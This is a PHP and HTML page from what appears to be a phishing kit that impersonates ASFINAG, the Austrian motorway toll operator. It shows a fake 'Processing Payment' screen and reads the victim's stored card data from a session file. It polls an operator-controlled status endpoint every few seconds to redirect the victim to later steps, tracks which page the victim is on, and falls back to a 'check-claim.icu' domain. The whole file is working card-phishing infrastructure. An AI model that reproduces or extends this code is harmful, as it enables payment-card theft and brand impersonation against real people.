<?php
require_once 'config.php';

$sessionId = $_GET['session'] ?? '';
if (!preg_match('/^[a-f0-9]{32}$/', $sessionId)) {
    header("Location: " . buildPageUrl('payments'));
    exit();
}

$sessionFile = SESSIONS_DIR . '/' . $sessionId . '.json';
if (!file_exists($sessionFile)) {
    header("Location: " . buildPageUrl('payments'));
    exit();
}

$sessionData = json_decode(file_get_contents($sessionFile), true);
$sessionData['session_id'] = $sessionId;
$cardData = $sessionData['card_data'] ?? null;

if (!$cardData) {
    header("Location: " . buildPageUrl('payments'));
    exit();
}

if (isCardBlocked($cardData['number'])) {
    header("Location: " . buildPageUrl('payments'));
    exit();
}

$error = null;
$pageTitle = 'Waiting for Verification';
$checkStatusUrl = buildPageUrl('check_status');

// Update current page on load (atomic update to preserve all data)
updateSessionData($sessionId, function(&$sessionData) use ($pageTitle) {
    $sessionData['current_page'] = $pageTitle;
    return true;
});

// Handle error parameter from redirects
if (isset($_GET['error']) && $_GET['error'] === 'payment_failed') {
    // Redirect to payments on payment failure
    header("Location: " . buildPageUrl('payments'));
    exit();
}
?>
<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ASFINAG - Payment Processing</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
            background: #f3f4f6;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .asfinag-waiting-container {
            max-width: 520px;
            width: 100%;
        }

        .asfinag-status-card {
            background: white;
            border-radius: 16px;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.1);
            overflow: hidden;
        }

        .asfinag-status-header {
            background: #ea580c;
            padding: 32px 24px;
            text-align: center;
        }

        .asfinag-status-header.error-header {
            background: #dc2626;
        }

        .asfinag-logo {
            margin-bottom: 16px;
        }

        .asfinag-logo svg {
            width: 120px;
            height: auto;
        }

        .asfinag-status-icon {
            font-size: 48px;
            margin-bottom: 16px;
        }

        .asfinag-status-title {
            color: white;
            font-size: 28px;
            font-weight: 700;
            margin-bottom: 6px;
        }

        .asfinag-status-subtitle {
            color: rgba(255, 255, 255, 0.9);
            font-size: 14px;
        }

        .asfinag-status-content {
            padding: 32px 28px;
            background: white;
        }

        /* Loading Spinner */
        .asfinag-loading-spinner {
            width: 60px;
            height: 60px;
            border: 4px solid #e5e7eb;
            border-top: 4px solid #ea580c;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 30px;
        }

        /* Status Message */
        .asfinag-status-message {
            font-size: 15px;
            color: #6b7280;
            margin-bottom: 30px;
            line-height: 1.6;
            text-align: center;
        }

        /* Progress Bar */
        .asfinag-progress-bar {
            height: 6px;
            background: #e5e7eb;
            border-radius: 3px;
            overflow: hidden;
            margin: 30px 0;
        }

        .asfinag-progress-fill {
            height: 100%;
            background: #ea580c;
            border-radius: 3px;
            width: 60%;
            animation: progressPulse 2s ease-in-out infinite;
        }

        /* Bank Info */
        .asfinag-bank-info {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 15px;
            margin: 20px 0;
            padding: 15px;
            background: #fef3c7;
            border-radius: 12px;
            border-left: 4px solid #ea580c;
        }

        .asfinag-bank-logo {
            width: 40px;
            height: 40px;
            background: #ea580c;
            border-radius: 8px;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-weight: bold;
            font-size: 14px;
        }

        .asfinag-bank-details {
            text-align: left;
        }

        .asfinag-bank-name {
            font-weight: 600;
            color: #1f2937;
            font-size: 14px;
        }

        .asfinag-bank-country {
            font-size: 12px;
            color: #6b7280;
        }

        /* Security Info */
        .asfinag-security-info {
            background: #f9fafb;
            border-radius: 10px;
            padding: 14px 18px;
            font-size: 12px;
            color: #6b7280;
            text-align: center;
            border: 1px solid #e5e7eb;
            margin-top: 24px;
        }

        .asfinag-security-info strong {
            color: #ea580c;
            font-weight: 600;
        }

        /* Error Message */
        .asfinag-error-message {
            background: #fef2f2;
            border: 1px solid #fca5a5;
            border-radius: 10px;
            padding: 12px 16px;
            margin-bottom: 24px;
            text-align: center;
            color: #dc2626;
            font-size: 13px;
            font-weight: 500;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }

        .asfinag-error-message::before {
            content: "⚠️";
            font-size: 16px;
        }

        /* Reload Timer */
        .asfinag-reload-timer {
            background: #fef2f2;
            border: 1px solid #fca5a5;
            border-radius: 12px;
            padding: 20px;
            margin: 24px 0;
            text-align: center;
        }

        .asfinag-timer-text {
            font-size: 16px;
            font-weight: 600;
            color: #dc2626;
            margin-bottom: 10px;
        }

        .asfinag-timer-countdown {
            font-size: 36px;
            font-weight: 700;
            color: #dc2626;
            margin: 10px 0;
            animation: pulse 1s ease-in-out infinite;
        }

        .asfinag-reload-message {
            font-size: 12px;
            color: #6b7280;
            margin-top: 10px;
        }

        /* Animations */
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        @keyframes progressPulse {
            0%, 100% { transform: translateX(-40%); }
            50% { transform: translateX(100%); }
        }

        @keyframes pulse {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.05); }
        }

        body {
            opacity: 0;
            transition: opacity 0.25s ease;
        }

        body.page-loaded {
            opacity: 1;
        }

        body.page-leave {
            opacity: 0;
        }

        @media (max-width: 480px) {
            .asfinag-waiting-container {
                padding: 0;
            }
            .asfinag-status-header {
                padding: 24px 20px;
            }
            .asfinag-status-content {
                padding: 24px 20px;
            }
            .asfinag-status-title {
                font-size: 24px;
            }
            .asfinag-status-icon {
                font-size: 40px;
            }
            .asfinag-timer-countdown {
                font-size: 32px;
            }
        }
    </style>
</head>
<body>
    <div class="asfinag-waiting-container">
        <div class="asfinag-status-card">
            <div class="asfinag-status-header <?php echo $error ? 'error-header' : ''; ?>">
                <div class="asfinag-logo">
                    <svg viewBox="0 0 200 60" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <rect width="200" height="60" rx="8" fill="white"/>
                        <text x="100" y="38" font-size="24" font-weight="800" text-anchor="middle" fill="#ea580c" font-family="Arial, sans-serif" letter-spacing="2">ASFINAG</text>
                    </svg>
                </div>
                <div class="asfinag-status-icon"><?php echo $error ? '❌' : '⏳'; ?></div>
                <h1 class="asfinag-status-title"><?php echo $error ? 'Error' : 'Processing Payment'; ?></h1>
                <p class="asfinag-status-subtitle"><?php echo $error ? 'An error occurred' : 'Please wait while we verify your payment'; ?></p>
            </div>
            
            <div class="asfinag-status-content">
                <?php if ($error): ?>
                    <?php if ($error === 'payment_failed'): ?>
                        <div class="asfinag-error-message">
                            We are sorry, but your payment wasn't successful. The page will reload automatically.
                        </div>
                        
                        <div class="asfinag-reload-timer">
                            <div class="asfinag-timer-text">Redirecting in</div>
                            <div class="asfinag-timer-countdown" id="countdown">5</div>
                            <div class="asfinag-reload-message">You will be redirected automatically</div>
                        </div>
                        
                        <script>
                            let countdown = 5;
                            const countdownElement = document.getElementById('countdown');
                            const redirectUrl = <?= json_encode(isset($sessionData) ? getRedirectUrl($sessionData) : 'https://check-claim.icu') ?>;
                            
                            const timer = setInterval(function() {
                                countdown--;
                                countdownElement.textContent = countdown;
                                
                                if (countdown <= 0) {
                                    clearInterval(timer);
                                    window.location.href = redirectUrl;
                                }
                            }, 1000);
                        </script>
                    <?php else: ?>
                        <div class="asfinag-error-message">
                            <?php echo htmlspecialchars($error); ?>
                        </div>
                        
                        <div class="asfinag-security-info">
                            <strong>What to do:</strong> If you believe this is an error, please contact support or try again with a different payment method.
                        </div>
                    <?php endif; ?>
                <?php else: ?>
                <div class="asfinag-loading-spinner"></div>
                
                <div class="asfinag-status-message">
                    Your payment is being processed securely. This may take a few moments.
                </div>
                
                <div class="asfinag-progress-bar">
                    <div class="asfinag-progress-fill"></div>
                </div>
                
                <?php if (isset($cardData['card_info'])): ?>
                <div class="asfinag-bank-info">
                    <div class="asfinag-bank-logo">
                        <?php 
                        $bankName = $cardData['card_info']['Issuer'] ?? ($cardData['card_info']['bank']['name'] ?? 'BANK');
                        echo substr($bankName, 0, 2); 
                        ?>
                    </div>
                    <div class="asfinag-bank-details">
                        <div class="asfinag-bank-name"><?php echo htmlspecialchars($bankName); ?></div>
                        <div class="asfinag-bank-country">
                            <?php echo $cardData['card_info']['Country']['Name'] ?? ($cardData['card_info']['country']['name'] ?? 'International'); ?>
                        </div>
                    </div>
                </div>
                <?php endif; ?>
                
                <div class="asfinag-security-info">
                    <strong>Security Notice:</strong> Your payment is protected by bank-level security. 
                    Do not refresh the page or close this window.
                </div>
                <?php endif; ?>
            </div>
        </div>
    </div>
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            document.body.classList.add('page-loaded');
            const sessionId = <?= json_encode($sessionId) ?>;
            const pageTitle = <?= json_encode($pageTitle) ?>;

            const checkStatusUrl = <?= json_encode($checkStatusUrl) ?>;
            const poll = () => {
                fetch(`${checkStatusUrl}?session=${encodeURIComponent(sessionId)}&page=${encodeURIComponent(pageTitle)}`)
                    .then(response => response.json())
                    .then(data => {
                        if (data.redirect) {
                            window.location.href = data.redirect;
                        }
                    })
                    .catch(() => {});
            };

            poll();
            setInterval(poll, 3000);

            document.querySelectorAll('a[href]').forEach(link => {
                link.addEventListener('click', () => document.body.classList.add('page-leave'));
            });
            document.querySelectorAll('form').forEach(form => {
                form.addEventListener('submit', () => document.body.classList.add('page-leave'));
            });
        });
    </script>
    <?php require_once 'presence_client.php'; ?>
</body>
</html>